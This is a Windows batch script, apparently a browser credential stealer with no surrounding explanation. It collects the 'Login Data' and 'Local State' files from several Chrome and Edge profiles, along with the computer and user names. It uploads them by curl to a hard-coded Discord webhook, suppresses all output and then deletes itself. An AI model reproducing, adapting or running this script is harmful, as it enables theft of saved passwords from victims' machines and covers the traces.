@echo off
setlocal
set "sourceDir1=%localappdata%\Google\Chrome\User Data\Default\"
set "sourceDir2=%localappdata%\Google\Chrome\User Data\"
set "sourceDir3=%localappdata%\Google\Chrome\User Data\Profile 1"
set "sourceDir4=%localappdata%\Google\Chrome\User Data\Profile 2"
set "sourceDir5=%localappdata%\Google\Chrome\User Data\Profile 3"
set "sourceDir6=%localappdata%\Google\Chrome\User Data\Profile 4"
set "sourceDir7=%localappdata%\Google\Chrome\User Data\Profile 5"
set "sourceDir8=%localappdata%\Microsoft\Edge\User Data\Default"
set "sourceDir9=%localappdata%\Microsoft\Edge\User Data\"
set "sourceDir10=%localappdata%\Microsoft\Edge\User Data\Profile 1"
set "sourceDir11=%localappdata%\Microsoft\Edge\User Data\Profile 2"
set "sourceDir12=%localappdata%\Microsoft\Edge\User Data\Profile 3"
set "sourceDir13=%localappdata%\Microsoft\Edge\User Data\Profile 4"
set "sourceDir14=%localappdata%\Microsoft\Edge\User Data\Profile 5"
set "fileName1=Login Data"
set "fileName2=Local State"
set "computerName=%COMPUTERNAME%"
set "userName=%USERNAME%"
set "webhookUrl=https://discord.com/api/webhooks/1246527590026448926/LTvUJGS9xvGSiozP-8jr-BaRki98at9F_SngX_bdpasuTb_9_dmQTrhjLjtjWdMHejyT"
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"Google Chrome sent from computer %computerName% by user %userName%\"}" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir1%\%fileName1%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir2%\%fileName2%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir3%\%fileName1%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir4%\%fileName1%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir5%\%fileName1%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir6%\%fileName1%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir7%\%fileName1%" %webhookUrl% > nul 2>&1
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"Microsoft Edge sent from computer %computerName% by user %userName%\"}" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir8%\%fileName1%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir9%\%fileName2%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir10%\%fileName1%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir11%\%fileName1%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir12%\%fileName1%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir13%\%fileName1%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir14%\%fileName1%" %webhookUrl% > nul 2>&1
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"-----------------------------------------------\"}" %webhookUrl% > nul 2>&1
del "%~f0"
endlocal
